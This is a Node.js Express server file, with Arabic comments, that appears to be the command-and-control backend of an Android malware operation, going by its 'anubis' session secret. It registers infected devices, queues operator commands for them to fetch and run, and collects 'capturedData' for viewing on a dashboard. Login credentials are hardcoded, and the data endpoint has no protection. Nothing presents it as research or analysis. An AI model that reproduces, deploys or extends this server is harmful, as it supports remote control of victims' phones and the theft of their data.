const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(bodyParser.json());
app.use(express.static(__dirname));
app.use(session({
    secret: 'anubis-secret-key-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));

// ===== التخزين =====
let devices = [];
let commands = [];
let capturedData = [];

// ===== تنظيف الأجهزة الميتة كل 10 ثواني =====
setInterval(() => {
    const now = Date.now();
    devices = devices.filter(device => {
        const lastSeen = new Date(device.last_seen).getTime();
        return (now - lastSeen) < 60000; // ← يختفي بعد 60 ثانية بدون اتصال
    });
}, 10000);

// ===== تسجيل الدخول =====
app.post('/api/login', (req, res) => {
    let { username, password } = req.body;
    username = (username || '').trim();
    password = (password || '').trim();
    
    if (username === 'admin' && password === 'anubis2024') {
        req.session.logged_in = true;
        res.json({ success: true });
    } else {
        res.json({ success: false });
    }
});

// ===== التحقق =====
app.get('/api/check-auth', (req, res) => {
    res.json({ logged_in: req.session.logged_in || false });
});

// ===== خروج =====
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// ===== تسجيل جهاز =====
app.post('/api/register-device', (req, res) => {
    const device = {
        id: req.body.device_id || 'unknown',
        model: req.body.model || 'Unknown',
        android_version: req.body.android_version || 'N/A',
        last_seen: new Date().toISOString(),
        online: true
    };
    
    const index = devices.findIndex(d => d.id === device.id);
    if (index !== -1) {
        devices[index] = { ...devices[index], ...device };
    } else {
        devices.push(device);
    }
    
    res.json({ success: true });
});

// ===== جلب الأجهزة =====
app.get('/api/devices', (req, res) => {
    // تحديث حالة الأجهزة
    const now = Date.now();
    devices = devices.filter(device => {
        const lastSeen = new Date(device.last_seen).getTime();
        device.online = (now - lastSeen) < 60000;
        return device.online;
    });
    
    res.json({ devices });
});

// ===== إرسال أمر =====
app.post('/api/commands', (req, res) => {
    const command = {
        id: Date.now(),
        device_id: req.body.device_id,
        command: req.body.command,
        status: 'pending'
    };
    commands.push(command);
    res.json({ success: true });
});

// ===== جلب أوامر =====
app.get('/api/get-commands/:deviceId', (req, res) => {
    const deviceCommands = commands.filter(c => 
        c.device_id === req.params.deviceId && c.status === 'pending'
    );
    deviceCommands.forEach(c => c.status = 'executed');
    res.json({ commands: deviceCommands });
});

// ===== إرسال بيانات =====
app.post('/api/send-data', (req, res) => {
    capturedData.push({
        device_id: req.body.device_id,
        data: req.body.data,
        timestamp: new Date().toISOString()
    });
    res.json({ success: true });
});

// ===== جلب بيانات =====
app.get('/api/data', (req, res) => {
    const logs = capturedData.map(item => 
        `[${item.timestamp}] ${item.data}`
    );
    res.json({ logs });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.listen(PORT, () => {
    console.log(`⚡ Running on port ${PORT}`);
});
